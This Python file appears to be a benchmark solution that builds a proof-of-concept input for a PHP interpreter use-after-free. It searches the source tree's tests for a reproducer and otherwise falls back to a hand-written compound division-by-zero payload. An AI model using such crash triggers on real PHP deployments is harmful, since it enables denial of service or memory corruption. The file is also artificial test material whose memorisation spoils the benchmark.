import os
import re
import tarfile
from typing import Iterable, Optional, Tuple


_SECTION_RE = re.compile(r"^--[A-Z0-9_]+--\s*$")


def _parse_phpt(phpt_text: str) -> Optional[str]:
    phpt_text = phpt_text.replace("\r\n", "\n").replace("\r", "\n")
    lines = phpt_text.split("\n")
    start = None
    for i, ln in enumerate(lines):
        if ln.strip() in ("--FILE--", "--FILEEOF--"):
            start = i + 1
            break
    if start is None:
        return None
    end = len(lines)
    for j in range(start, len(lines)):
        if _SECTION_RE.match(lines[j]):
            end = j
            break
    code = "\n".join(lines[start:end]).strip()
    return code if code else None


def _strip_php_tags(code: str) -> str:
    s = code.lstrip()
    if s.startswith("\ufeff"):
        s = s.lstrip("\ufeff")
    s_strip = s.lstrip()
    lowered = s_strip.lower()
    if lowered.startswith("<?php"):
        s_strip = s_strip[5:]
        s_strip = s_strip.lstrip()
    elif lowered.startswith("<?"):
        s_strip = s_strip[2:]
        s_strip = s_strip.lstrip()
    s_strip = s_strip.rstrip()
    if s_strip.endswith("?>"):
        s_strip = s_strip[:-2].rstrip()
    return s_strip


def _normalize_php_code(code: str, needs_tags: bool) -> str:
    code = code.replace("\r\n", "\n").replace("\r", "\n").strip()
    if needs_tags:
        s = code.lstrip()
        if not (s.startswith("<?") or s.lower().startswith("<?php")):
            return "<?php " + code
        return code
    else:
        return _strip_php_tags(code)


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self.is_dir = os.path.isdir(src_path)
        self.is_tar = (not self.is_dir) and tarfile.is_tarfile(src_path)

    def iter_files(
        self,
        exts: Tuple[str, ...],
        max_size: int,
        name_predicate=None,
    ) -> Iterable[Tuple[str, bytes]]:
        if self.is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    if exts and not fn.lower().endswith(exts):
                        continue
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, self.src_path).replace(os.sep, "/")
                    if name_predicate is not None and not name_predicate(rel):
                        continue
                    try:
                        st = os.stat(full)
                    except OSError:
                        continue
                    if st.st_size > max_size:
                        continue
                    try:
                        with open(full, "rb") as f:
                            data = f.read(max_size + 1)
                    except OSError:
                        continue
                    if len(data) > max_size:
                        continue
                    yield rel, data
        elif self.is_tar:
            try:
                with tarfile.open(self.src_path, "r:*") as tf:
                    for m in tf:
                        if not m.isfile():
                            continue
                        name = (m.name or "").lstrip("./")
                        low = name.lower()
                        if exts and not low.endswith(exts):
                            continue
                        if name_predicate is not None and not name_predicate(name):
                            continue
                        if m.size is None or m.size > max_size:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read(max_size + 1)
                        except Exception:
                            continue
                        if len(data) > max_size:
                            continue
                        yield name, data
            except Exception:
                return
        else:
            return

    def has_php_markers(self) -> bool:
        markers = (
            "zend/zend_execute.c",
            "zend/zend_vm_def.h",
            "main/php.h",
            "zend/zend.h",
            "sapi/fuzzer",
        )

        def pred(name: str) -> bool:
            low = name.lower()
            for mk in markers:
                if mk in low:
                    return True
            return False

        for _, _ in self.iter_files((".c", ".h", ".in", ".m4", ".txt"), 256_000, pred):
            return True
        return False


def _detect_php_needs_tags(sr: _SourceReader) -> bool:
    def harness_pred(name: str) -> bool:
        low = name.lower()
        return (
            "fuzz" in low
            or "fuzzer" in low
            or "oss-fuzz" in low
            or "llvmfuzzer" in low
        ) and (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".h"))

    found_eval = False
    found_file = False

    for _, data in sr.iter_files((".c", ".cc", ".cpp", ".h"), 400_000, harness_pred):
        txt = data.decode("utf-8", errors="ignore")
        if "LLVMFuzzerTestOneInput" not in txt and "FuzzerTestOneInput" not in txt:
            continue
        if "zend_eval_string" in txt or "zend_eval_stringl" in txt or "zend_compile_string" in txt:
            found_eval = True
        if "zend_compile_file" in txt or "php_execute_script" in txt:
            found_file = True

    if found_eval and not found_file:
        return False
    if found_file and not found_eval:
        return True
    return False


def _find_php_reproducer(sr: _SourceReader, needs_tags: bool) -> Optional[bytes]:
    best: Optional[bytes] = None

    def likely_test(name: str) -> bool:
        low = name.lower()
        if not (low.endswith(".phpt") or low.endswith(".php")):
            return False
        return (
            "/test" in low
            or "/tests/" in low
            or "zend/tests" in low
            or "ext/" in low
            or "sapi/fuzzer" in low
            or "oss-fuzz" in low
            or "repro" in low
            or "poc" in low
            or "bug" in low
        )

    def score_candidate(code_str: str) -> bytes:
        norm = _normalize_php_code(code_str, needs_tags)
        return norm.encode("utf-8", errors="strict")

    patterns_strong = ("35876", "use after free", "heap-use-after-free", "uaf")
    patterns_div = ("/=", "DivisionByZero", "division by zero", "Division by zero")

    # Pass 1: very strong hints
    for name, data in sr.iter_files((".phpt", ".php"), 200_000, likely_test):
        txt = data.decode("utf-8", errors="ignore")
        lowtxt = txt.lower()
        if not any(p in lowtxt for p in patterns_strong):
            continue
        code = _parse_phpt(txt) if name.lower().endswith(".phpt") else txt.strip()
        if not code:
            continue
        if not ("/=" in code and "0" in code):
            continue
        cand = score_candidate(code)
        if best is None or len(cand) < len(best):
            best = cand

    if best is not None:
        return best

    # Pass 2: division by zero / compound division patterns
    for name, data in sr.iter_files((".phpt", ".php"), 200_000, likely_test):
        txt = data.decode("utf-8", errors="ignore")
        if "/=" not in txt or "0" not in txt:
            continue
        if not any(p in txt for p in patterns_div):
            continue
        code = _parse_phpt(txt) if name.lower().endswith(".phpt") else txt.strip()
        if not code:
            continue
        cand = score_candidate(code)
        if best is None or len(cand) < len(best):
            best = cand

    return best


def _fallback_php(needs_tags: bool) -> bytes:
    # Try multiple compound division contexts to maximize likelihood:
    # - CV (/= on variable)
    # - DIM (/= on array element)
    # - OBJ (/= on object property)
    code = (
        '$a="1";$a.=$a;try{$a/=0;}catch(Error$e){}unset($a);'
        '$b="1";$b.=$b;$c=[$b];unset($b);try{$c[0]/=0;}catch(Error$e){}unset($c);'
        '$d="1";$d.=$d;$o=(object)["p"=>$d];unset($d);try{$o->p/=0;}catch(Error$e){}unset($o);'
    )
    code = _normalize_php_code(code, needs_tags)
    return code.encode("utf-8", errors="strict")


class Solution:
    def solve(self, src_path: str) -> bytes:
        sr = _SourceReader(src_path)

        # Assume PHP unless obvious otherwise; but do a quick marker check.
        is_php = sr.has_php_markers()
        if not is_php:
            return _fallback_php(needs_tags=False)

        needs_tags = _detect_php_needs_tags(sr)
        poc = _find_php_reproducer(sr, needs_tags)
        if poc is not None and len(poc) > 0:
            return poc

        return _fallback_php(needs_tags=needs_tags)